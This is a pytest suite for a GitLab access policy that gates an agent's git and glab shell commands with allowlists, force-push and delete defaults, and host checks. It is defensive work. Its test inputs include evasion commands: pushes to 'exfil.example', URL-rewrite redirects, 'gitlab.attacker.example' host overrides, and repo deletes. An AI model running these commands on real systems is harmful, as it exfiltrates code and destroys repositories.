"""
Tests for the built-in GitLab access policy
(:mod:`omnigent.policies.builtins.gitlab`) — the ``gitlab_policy`` factory
covering ``git`` and ``glab`` shell commands.

Layers:

- **Layer 1** — direct callable: project / branch allowlists, nested groups,
  self-managed hosts, destructive / force / tag defaults, ``glab api``
  methods, ASK on unresolvable targets, and abstention on other hosts.
- **Layer 2** — spec resolution through :func:`resolve_function_policy`.
- **Layer 3** — registry discovery and params validation.
"""

from __future__ import annotations

import pytest

from omnigent.policies.builtins.github import github_policy
from omnigent.policies.builtins.gitlab import _GLAB_ACTIONS, gitlab_policy
from omnigent.policies.function import FunctionPolicy, resolve_function_policy
from omnigent.policies.registry import get_registry, load_registry, validate_factory_params
from omnigent.policies.schema import PolicyEvent, PolicyResponse
from omnigent.policies.types import EvaluationContext
from omnigent.spec.types import FunctionPolicySpec, FunctionRef, Phase, PolicyAction
from tests.policies.builtins.helpers import tool_call_event as tc

_HANDLER = "omnigent.policies.builtins.gitlab.gitlab_policy"
_PROJECT = "grp/sub/app"
_URL = "https://gitlab.com/grp/sub/app.git"
_SELF_HOST = "gitlab.example.com"


def _sh(command: str) -> PolicyEvent:
    """Build a ``sys_os_shell`` ``tool_call`` event carrying *command*."""
    return tc("sys_os_shell", {"command": command})


def _result(response: PolicyResponse | None) -> str:
    """Return ``"ALLOW"`` for an abstain, else the decision's result."""
    return response["result"] if response else "ALLOW"


# ══════════════════════════════════════════════════════════════════════════════
# Layer 1 — git push / fetch
# ══════════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        (f"git push {_URL} main", "ALLOW"),
        ("git push git@gitlab.com:grp/sub/app.git main", "ALLOW"),
        ("git push ssh://git@gitlab.com/Grp/Sub/App.git main", "ALLOW"),
        ("git push https://gitlab.com/grp/other.git main", "DENY"),
        # A parent group is a different project than its nested child.
        ("git push https://gitlab.com/grp/sub.git main", "DENY"),
        ("git push origin main", "ASK"),
        ("git status && git commit -m wip", "ALLOW"),
    ],
)
def test_git_push_project_allowlist(command: str, expected: str) -> None:
    """Pushes are allowed only to write_repos; aliases need approval."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    assert _result(policy(_sh(command))) == expected


@pytest.mark.parametrize(
    "command",
    [
        f"git push --force {_URL} main",
        f"git push -f {_URL} main",
        f"git push -uf {_URL} main",
        f"git push --force-with-lease {_URL} main",
        f"git push --force-if-includes {_URL} main",
        f"git push {_URL} +main",
    ],
)
def test_force_push_denied_by_default(command: str) -> None:
    """Every force-push spelling is denied even on an allowed project."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    result = policy(_sh(command))
    assert result is not None and result["result"] == "DENY"
    assert "force push" in result["reason"].lower()
    assert _result(gitlab_policy(write_repos=[_PROJECT], deny_force_push=False)(_sh(command))) == (
        "ALLOW"
    )


@pytest.mark.parametrize(
    "command",
    [f"git push --delete {_URL} feature", f"git push {_URL} :feature"],
)
def test_branch_delete_denied_unless_allow_destructive(command: str) -> None:
    """Remote branch deletes are destructive and denied by default."""
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == "DENY"
    allowed = gitlab_policy(write_repos=[_PROJECT], allow_destructive=True)
    assert _result(allowed(_sh(command))) == "ALLOW"


def test_tag_push_denied_by_default() -> None:
    """Tag pushes are denied unless deny_tag_push is turned off."""
    command = f"git push {_URL} --tags"
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == "DENY"
    allowed = gitlab_policy(write_repos=[_PROJECT], deny_tag_push=False)
    assert _result(allowed(_sh(command))) == "ALLOW"


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        (f"git push {_URL} main", "ALLOW"),
        (f"git push {_URL} feature", "DENY"),
        (f"git push {_URL}", "ASK"),
    ],
)
def test_write_branches(command: str, expected: str) -> None:
    """Branch-restricted pushes need a determinable, allowed branch."""
    policy = gitlab_policy(write_repos=[_PROJECT], write_branches=["main"])
    assert _result(policy(_sh(command))) == expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        # Option values are skipped, so the remote is the first real positional.
        ("git push -o ci.skip=https://x.example https://gitlab.com/grp/other.git main", "DENY"),
        ("git push --push-option=a://b https://gitlab.com/grp/other.git main", "DENY"),
        (f"git push -oci.skip {_URL} main", "ALLOW"),
        (f"git push --recurse-submodules check {_URL} main", "ALLOW"),
        ("git push --repo=https://gitlab.com/grp/other.git", "DENY"),
        # The positional remote overrides --repo.
        (f"git push --repo={_URL} origin main", "ASK"),
        ("git push https://exfil.example/grp/sub/app main", "ASK"),
        # Abbreviated and bundled spellings of delete / force.
        (f"git push --del {_URL} feature", "DENY"),
        (f"git push -ud {_URL} feature", "DENY"),
        (f"git push --force-w {_URL} main", "DENY"),
        # --mirror force-updates and deletes refs; --prune deletes them.
        (f"git push --mirror {_URL}", "DENY"),
        (f"git push --prune {_URL} main", "DENY"),
        # Dot segments after ``/-/`` would resolve to another project.
        (f"git push {_URL}/-/../../../../grp/other.git main", "ASK"),
        # URL rewriting config changes the remote after the URL is parsed.
        (f"git -c url.file:///tmp/sink.git.insteadOf={_URL} push {_URL} HEAD:main", "ASK"),
        (f"git -curl.file:///tmp/sink.git.pushInsteadOf={_URL} push {_URL} main", "ASK"),
        (f"git --config-env=url.file:///tmp/sink.git.insteadOf=VAR push {_URL} main", "ASK"),
        (f"git config url.file:///tmp/sink.git.insteadOf {_URL}", "ASK"),
        (f"GIT_CONFIG_COUNT=1 git push {_URL} main", "ASK"),
        (f"git -c user.name=bot push {_URL} main", "ALLOW"),
    ],
)
def test_git_push_remote_and_flag_parsing(command: str, expected: str) -> None:
    """Remote detection and flags follow ``git push -h``, not the first URL-like token."""
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == expected


def test_mirror_push_is_destructive() -> None:
    """--mirror deletes remote refs, so it needs allow_destructive even when forcing is allowed."""
    command = f"git push --mirror {_URL}"
    lenient = {"write_repos": [_PROJECT], "deny_force_push": False, "deny_tag_push": False}
    assert _result(gitlab_policy(**lenient)(_sh(command))) == "DENY"  # type: ignore[arg-type]
    allowed = gitlab_policy(**lenient, allow_destructive=True)  # type: ignore[arg-type]
    assert _result(allowed(_sh(command))) == "ALLOW"


def test_restricted_reads() -> None:
    """With read_all off, only read_repos may be cloned or fetched."""
    policy = gitlab_policy(read_all=False, read_repos=[_PROJECT])
    assert _result(policy(_sh(f"git clone {_URL}"))) == "ALLOW"
    assert _result(policy(_sh("git clone https://gitlab.com/grp/secret.git"))) == "DENY"
    assert _result(policy(_sh("git fetch origin"))) == "ASK"


# ══════════════════════════════════════════════════════════════════════════════
# Layer 1 — hosts
# ══════════════════════════════════════════════════════════════════════════════


def test_self_managed_host_is_gated() -> None:
    """A configured self-managed host is owned; a bare entry matches any owned host."""
    policy = gitlab_policy(hosts=["gitlab.com", _SELF_HOST], write_repos=[_PROJECT])
    assert _result(policy(_sh(f"git push https://{_SELF_HOST}/grp/sub/app main"))) == "ALLOW"
    assert _result(policy(_sh(f"git push https://{_SELF_HOST}/grp/x main"))) == "DENY"


def test_url_entry_pins_project_to_its_host() -> None:
    """A URL allowlist entry does not allow the same path on another host."""
    policy = gitlab_policy(
        hosts=["gitlab.com", _SELF_HOST], write_repos=[f"https://{_SELF_HOST}/{_PROJECT}"]
    )
    assert _result(policy(_sh(f"git push https://{_SELF_HOST}/{_PROJECT} main"))) == "ALLOW"
    assert _result(policy(_sh(f"git push {_URL} main"))) == "DENY"


@pytest.mark.parametrize(
    "command",
    [
        "git push https://evil-gitlab.example/grp/sub/app main",
        "git push https://gitlab.com.example.net/grp/sub/app main",
        "git push git@gitlab.invalid:grp/sub/app.git main",
    ],
)
def test_git_to_unknown_hosts_asks(command: str) -> None:
    """A remote on a host no git provider owns may be a look-alike, so it needs approval."""
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == "ASK"


def test_hostless_project_asks_for_host_pinned_entry() -> None:
    """``-R grp/app`` has no host, so it cannot match an entry pinned to one host."""
    policy = gitlab_policy(
        hosts=["gitlab.com", _SELF_HOST], write_repos=[f"https://{_SELF_HOST}/{_PROJECT}"]
    )
    assert _result(policy(_sh(f"glab mr create -R {_PROJECT}"))) == "ASK"
    assert _result(policy(_sh(f"glab mr create -R {_SELF_HOST}/{_PROJECT}"))) == "ALLOW"


@pytest.mark.parametrize(
    "arguments",
    [
        {"write_repos": ["https://gitlab.other.example/grp/app"]},
        {"read_all": False, "read_repos": ["not a project"]},
    ],
)
def test_allowlist_entry_off_configured_hosts_raises(arguments: dict[str, object]) -> None:
    """An entry that names no project on a configured host fails at build time."""
    with pytest.raises(ValueError, match="configured hosts"):
        gitlab_policy(**arguments)  # type: ignore[arg-type]


def test_composes_with_github_policy() -> None:
    """A GitHub push is ignored by the GitLab policy and gated by the GitHub one."""
    command = "git push https://github.com/octo/hello main"
    assert gitlab_policy(write_repos=[_PROJECT])(_sh(command)) is None
    assert _result(github_policy(write_repos=["octo/hello"])(_sh(command))) == "ALLOW"


# ══════════════════════════════════════════════════════════════════════════════
# Layer 1 — glab
# ══════════════════════════════════════════════════════════════════════════════


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        (f"glab mr create -R {_PROJECT} --fill", "ALLOW"),
        (f"glab mr create --repo {_URL} -b main --fill", "ALLOW"),
        (f"glab mr create -R gitlab.com/{_PROJECT} --fill", "ALLOW"),
        ("glab mr create -R grp/other --fill", "DENY"),
        ("glab mr merge 12", "ASK"),
        (f"glab issue board create -R {_PROJECT}", "ALLOW"),
        ("glab mr list", "ALLOW"),
        (f"glab mr view 12 -R {_PROJECT}", "ALLOW"),
        ("glab auth login --hostname gitlab.com", "ALLOW"),
    ],
)
def test_glab_write_allowlist(command: str, expected: str) -> None:
    """glab writes are gated by project; reads and auth pass by default."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    assert _result(policy(_sh(command))) == expected


def test_glab_target_branch_gated() -> None:
    """A merge request's target branch is checked against write_branches."""
    policy = gitlab_policy(write_repos=[_PROJECT], write_branches=["main"])
    assert _result(policy(_sh(f"glab mr create -R {_PROJECT} -b main"))) == "ALLOW"
    assert _result(policy(_sh(f"glab mr create -R {_PROJECT} -b release"))) == "DENY"


@pytest.mark.parametrize(
    "command",
    [
        f"glab repo delete {_PROJECT} --yes",
        f"glab release delete v1 -R {_PROJECT}",
        f"glab variable delete TOKEN -R {_PROJECT}",
        f"glab mr merge 12 -d -R {_PROJECT}",
        f"glab container-registry tag delete -R {_PROJECT}",
    ],
)
def test_glab_destructive_denied_by_default(command: str) -> None:
    """Deletes are denied on allowed projects unless allow_destructive."""
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == "DENY"
    allowed = gitlab_policy(write_repos=[_PROJECT], allow_destructive=True)
    assert _result(allowed(_sh(command))) == "ALLOW"


_GLAB_ACTIONS_BY_KIND = {
    kind: [
        f"glab {group} {action}"
        for group, actions in _GLAB_ACTIONS.items()
        for action, action_kind in actions.items()
        if action_kind == kind
    ]
    for kind in ("write", "destructive")
}


# Written from glab's help, not from the table, so a wrong table row fails here.
_EXPECTED_GLAB_DECISIONS = {"read": ("ALLOW", "ALLOW"), "write": ("ALLOW", "DENY")}
_EXPECTED_GLAB_DECISIONS["destructive"] = ("DENY", "DENY")


@pytest.mark.parametrize(
    ("command", "kind"),
    [
        ("glab mr list", "read"),
        ("glab mr view 1", "read"),
        ("glab mr approve 1", "write"),
        ("glab mr note create 1", "write"),
        ("glab mr delete 1", "destructive"),
        ("glab issue create", "write"),
        ("glab issue delete 1", "destructive"),
        ("glab ci status", "read"),
        ("glab ci retry 1", "write"),
        ("glab ci delete 1", "destructive"),
        ("glab variable get TOKEN", "read"),
        ("glab variable set TOKEN x", "write"),
        ("glab release create v1", "write"),
        ("glab token revoke bot", "destructive"),
        ("glab label delete bug", "destructive"),
    ],
)
def test_glab_actions_match_expected_kind(command: str, kind: str) -> None:
    """Each action has the kind glab's help gives it: (allowed project, other project)."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    decisions = (
        _result(policy(_sh(f"{command} -R {_PROJECT}"))),
        _result(policy(_sh(f"{command} -R grp/other"))),
    )
    assert decisions == _EXPECTED_GLAB_DECISIONS[kind]


@pytest.mark.parametrize("command", _GLAB_ACTIONS_BY_KIND["write"])
def test_every_glab_write_is_project_gated(command: str) -> None:
    """Each listed write passes on an allowed project and is denied on another."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    if command == "glab stack sync":
        command += " --skip-push"  # Without it, the sync force-pushes.
    assert _result(policy(_sh(f"{command} -R {_PROJECT}"))) == "ALLOW"
    assert _result(policy(_sh(f"{command} -R grp/other"))) == "DENY"


@pytest.mark.parametrize("command", _GLAB_ACTIONS_BY_KIND["destructive"])
def test_every_glab_delete_needs_allow_destructive(command: str) -> None:
    """Each listed delete is denied on an allowed project unless allow_destructive."""
    command = f"{command} -R {_PROJECT}"
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == "DENY"
    allowed = gitlab_policy(write_repos=[_PROJECT], allow_destructive=True)
    assert _result(allowed(_sh(command))) == "ALLOW"


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        # Hidden aliases resolve to the action they stand for.
        ("glab mr new -R grp/other", "DENY"),
        (f"glab mr del 1 -R {_PROJECT}", "DENY"),
        (f"glab pipeline delete 1 -R {_PROJECT}", "DENY"),
        # Bundled short flags still remove the source branch.
        (f"glab mr merge 1 -sd -R {_PROJECT}", "DENY"),
        (f"glab mr merge 1 -s -R {_PROJECT}", "ALLOW"),
        (f"glab opentofu state delete prod -R {_PROJECT}", "DENY"),
        ("glab stack sync", "DENY"),
        ("glab stack save", "ALLOW"),
        # Unknown actions and groups that can run any glab command ask.
        (f"glab mr frobnicate -R {_PROJECT}", "ASK"),
        ("glab mcp serve", "ASK"),
        ("glab duo cli", "ASK"),
        ("glab mr", "ALLOW"),
        # A flag before the group or action could hide what runs, so it asks.
        ("glab --repo=grp/other mr create --fill", "ASK"),
        ("glab mr --sha list merge 12 -R grp/other", "ASK"),
        ("glab --help", "ALLOW"),
        # Repeated or attached -R values cannot pass for an allowed project.
        (f"glab mr create -R {_PROJECT} -R grp/other", "ASK"),
        (f"glab mr create -R {_PROJECT} -Rgrp/other", "ASK"),
        ("glab mr create -Rgrp/other", "DENY"),
    ],
)
def test_glab_dispatch(command: str, expected: str) -> None:
    """glab aliases, bundled flags, and unlisted actions follow glab's own dispatch."""
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("glab api projects/grp%2Fsub%2Fapp/merge_requests", "ALLOW"),
        ("glab api projects/grp%2Fsub%2Fapp/issues -f title=x", "ALLOW"),
        ("glab api projects/grp%2Fother/issues -f title=x", "DENY"),
        ("glab api -X DELETE projects/grp%2Fsub%2Fapp/issues/1", "DENY"),
        ("glab api -X POST projects/123/issues", "ASK"),
        # Flag values (-H, -X) are not mistaken for the endpoint.
        ("glab api -H X:/projects/grp%2Fsub%2Fapp projects/grp%2Fother/issues -f t=x", "DENY"),
        ("glab api -X POST projects/grp%2Fsub%2Fapp/issues", "ALLOW"),
        ("glab api -X POST projects/grp%2Fsub%2Fapp/../grp%2Fother/issues", "ASK"),
        ("glab api -X POST projects/grp%2Fsub%2Fapp/x/projects/grp%2Fother", "ASK"),
        ("glab api -X POST https://gitlab.example.com/api/v4/projects/1", "ASK"),
        # Attached values (-XDELETE, -ftitle=x) parse like separate ones.
        ("glab api -XDELETE projects/grp%2Fsub%2Fapp/issues/1", "DENY"),
        ("glab api -iXPOST projects/grp%2Fother/issues", "DENY"),
        ("glab api projects/grp%2Fother/issues -ftitle=x", "DENY"),
        ("glab api projects/grp%2Fother/issues -Fconfidential=true", "DENY"),
        ("glab api projects/grp%2Fsub%2Fapp/issues -ftitle=x", "ALLOW"),
        ("glab api -X GET -X DELETE projects/grp%2Fsub%2Fapp/issues/1", "ASK"),
    ],
)
def test_glab_api_method(command: str, expected: str) -> None:
    """glab api is a read unless it sets a write method or field flags."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    assert _result(policy(_sh(command))) == expected


_FILES_API = "glab api -X PUT projects/grp%2Fsub%2Fapp/repository/files/a.txt -f content=x"


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        (f"{_FILES_API} -f branch=main", "ALLOW"),
        (f"{_FILES_API} -f branch=release", "DENY"),
        ("glab api projects/grp%2Fsub%2Fapp/repository/commits?branch=release -f x=y", "DENY"),
        ("glab api -X POST projects/grp%2Fsub%2Fapp/repository/branches -f branch=main", "ALLOW"),
        # The destination cannot be known from a body file or a placeholder.
        (f"{_FILES_API} --input body.json", "ASK"),
        (f"{_FILES_API} -f branch=:branch", "ASK"),
        (_FILES_API, "ASK"),
        # Reads and non-branch writes are not branch-gated.
        ("glab api projects/grp%2Fsub%2Fapp/repository/files/a.txt?ref=release", "ALLOW"),
        ("glab api projects/grp%2Fsub%2Fapp/issues -f title=x", "ALLOW"),
    ],
)
def test_glab_api_branch_writes(command: str, expected: str) -> None:
    """API routes that write branch content are held to write_branches."""
    policy = gitlab_policy(write_repos=[_PROJECT], write_branches=["main"])
    assert _result(policy(_sh(command))) == expected


@pytest.mark.parametrize(
    "command",
    [
        f"glab mr create -R {_PROJECT} --hostname gitlab.attacker.example",
        f"GITLAB_HOST=gitlab.attacker.example glab mr create -R {_PROJECT}",
        "glab mr create -R https://gitlab.attacker.example/grp/sub/app",
        f"GITLAB_URI=gitlab.attacker.example glab mr create -R {_PROJECT}",
        f"GL_HOST=gitlab.attacker.example glab mr create -R {_PROJECT}",
        f"export GITLAB_HOST=gitlab.attacker.example && glab mr create -R {_PROJECT}",
        "glab config set host gitlab.attacker.example",
    ],
)
def test_glab_redirected_to_unowned_host_asks(command: str) -> None:
    """glab pointed at a host outside the policy cannot inherit an allowed project."""
    assert _result(gitlab_policy(write_repos=[_PROJECT])(_sh(command))) == "ASK"


def test_wrapped_and_chained_commands_are_gated() -> None:
    """Shell wrappers are unwrapped and the worst decision wins."""
    policy = gitlab_policy(write_repos=[_PROJECT])
    assert _result(policy(_sh(f"bash -c 'glab repo delete {_PROJECT}'"))) == "DENY"
    assert _result(policy(_sh(f"git add . && git push --force {_URL} main"))) == "DENY"


def test_ignores_non_shell_tools() -> None:
    """MCP and other tools are not inspected."""
    event = tc("mcp__gitlab__delete_project", {"project": _PROJECT})
    assert gitlab_policy(write_repos=[_PROJECT])(event) is None


# ══════════════════════════════════════════════════════════════════════════════
# Layer 2 — spec resolution through resolve_function_policy
# ══════════════════════════════════════════════════════════════════════════════


@pytest.mark.asyncio
async def test_resolve_from_spec_denies_force_push() -> None:
    """gitlab_policy resolves and a force push DENYs through the engine."""
    spec = FunctionPolicySpec(
        name="gl",
        on=None,
        function=FunctionRef(path=_HANDLER, arguments={"write_repos": [_PROJECT]}),
    )
    policy: FunctionPolicy = resolve_function_policy(spec)
    command = f"git push -f {_URL} main"
    result = await policy.evaluate(
        EvaluationContext(
            phase=Phase.TOOL_CALL,
            tool_name="sys_os_shell",
            content={"name": "sys_os_shell", "arguments": {"command": command}},
        ),
        {},
    )
    assert result.action == PolicyAction.DENY


# ══════════════════════════════════════════════════════════════════════════════
# Layer 3 — registry
# ══════════════════════════════════════════════════════════════════════════════


def test_registry_discovers_gitlab_policy() -> None:
    """gitlab_policy is a browsable factory whose schema validates params."""
    load_registry()
    by_handler = {entry.handler: entry for entry in get_registry()}
    assert by_handler[_HANDLER].kind == "factory"
    good: dict[str, object] = {
        "hosts": [_SELF_HOST],
        "write_repos": [_PROJECT],
        "deny_force_push": True,
    }
    assert validate_factory_params(_HANDLER, good) is None
    assert validate_factory_params(_HANDLER, {"bogus": 1}) is not None
    assert validate_factory_params(_HANDLER, {"allow_destructive": "yes"}) is not None
